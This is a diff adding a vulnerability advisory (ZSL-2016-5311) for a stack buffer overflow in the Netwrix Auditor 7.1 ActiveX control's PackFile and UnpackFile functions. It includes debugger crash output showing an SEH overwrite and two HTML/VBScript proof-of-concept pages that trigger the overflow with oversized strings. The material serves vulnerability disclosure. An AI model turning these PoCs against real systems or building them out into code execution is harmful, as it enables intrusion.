@@ -1,0 +1,90 @@
+﻿
+Netwrix Auditor 7.1.322.0 ActiveX (sourceFile) Stack Buffer Overflow Vulnerability
+
+
+Vendor: Netwrix Corporation
+Product web page: http://www.netwrix.com
+Affected version: 7.1 (Build 322)
+
+Summary: Netwrix Auditor is an IT audit software that maximizes visibility
+of IT infrastructure changes and data access. The product provides actionable
+audit data about who changed what, when and where and who has access to what.
+
+Desc: The application suffers from a stack-based buffer overflow vulnerability
+when parsing large amount of bytes to the 'sourceFile' string parameter in
+PackFile() and UnpackFile() functions in 'Netwrix.Common.CollectEngine.dll'
+library, resulting in stack overrun overwriting several registers including
+the SEH chain. An attacker can gain access to the system of the affected node
+and execute arbitrary code.
+
+----------------------------------------------------------------------------
+STATUS_STACK_BUFFER_OVERRUN encountered
+(1fbc.1470): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=63d7e5b8 ecx=7693047c edx=0040db55 esi=00000000 edi=0072a4ac
+eip=7693025d esp=0040dd9c ebp=0040de18 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+kernel32!GetProfileStringW+0x12cc1:
+7693025d cc              int     3
+
+--
+
+(1a98.1c4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** WARNING: Unable to verify checksum for C:\Program Files (x86)\Common Files\Netwrix Auditor\Event Collector\Netwrix.Common.CollectEngine.dll
+eax=00000041 ebx=000012b2 ecx=00350000 edx=00000020 esi=00762240 edi=0034dc7c
+eip=5dd16895 esp=0034d75c ebp=0034d778 iopl=0         nv up ei pl nz ac po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010213
+Netwrix_Common_CollectEngine!DllUnregisterServer+0x21725:
+5dd16895 668901          mov     word ptr [ecx],ax        ds:002b:00350000=????
+0:000> !exchain
+0034e51c: 00410041
+Invalid exception stack at 00410041
+----------------------------------------------------------------------------
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Microsoft Windows 7 Ultimate SP1 (EN)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5311
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5311.php
+
+
+07.12.2015
+
+--
+
+
+#1
+
+<html>
+<object classid='clsid:F45C10B1-AEB6-4D2C-BC17-97749DA1F908' id='acnid' />
+<script language='VBScript'>
+Target = "C:\Program Files (x86)\Common Files\Netwrix Auditor\Event Collector\Netwrix.Common.CollectEngine.dll"
+Prototype = "Sub PackFile (ByVal sourceFile As String, ByVal packedFile As String)"
+Member = "PackFile"
+ID = "CollectEngineLib.FileCompress"
+src = String(2000, "A")
+packed = "exploit.zip"
+acnid.PackFile src, packed
+</script>
+
+
+#2
+
+<html>
+<object classid='clsid:F45C10B1-AEB6-4D2C-BC17-97749DA1F908' id='anida' />
+<script language='VBScript'>
+Target = "C:\Program Files (x86)\Common Files\Netwrix Auditor\Event Collector\Netwrix.Common.CollectEngine.dll"
+Prototype = "Sub UnpackFile (ByVal sourceFile As String, ByVal unpackedFile As String)"
+Member = "UnpackFile"
+ID = "CollectEngineLib.FileCompress"
+src = String(900, "A") + "BB" + "CC" + String(105, "D") + String(100, "EE")
+unpack = "exploit.zip"
+anida.UnpackFile src, unpack
+</script>
+</html>
